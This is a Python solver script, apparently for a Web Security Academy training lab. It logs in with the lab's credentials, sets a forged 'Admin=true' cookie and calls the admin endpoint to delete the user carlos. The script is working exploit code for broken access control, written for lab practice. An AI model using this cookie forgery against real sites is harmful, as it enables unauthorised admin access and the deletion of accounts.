# usage:
# python3 2.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net \
# --d carlos

import re
from argparse import ArgumentParser

import requests


def solve(url: str, delete: str) -> None:
    s = requests.Session()
    login_url = f"{url.rstrip('/')}/login"

    # Get the /login page and acquire csrf token
    r = s.get(login_url)
    csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]

    # Login as wiener
    r = s.post(
        login_url,
        data={
            "csrf": csrf,
            "username": "wiener",
            "password": "peter",
        },
    )

    # Set Admin cookie to "true"
    cookies = s.cookies.get_dict()
    cookies["Admin"] = "true"

    # Delete user
    s = requests.Session()
    r = s.get(f"{url.rstrip('/')}/admin/delete?username={delete}", cookies=cookies)


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--d", "--delete", dest="delete")
    args = parser.parse_args()
    solve(args.url, args.delete)


if __name__ == "__main__":
    main()
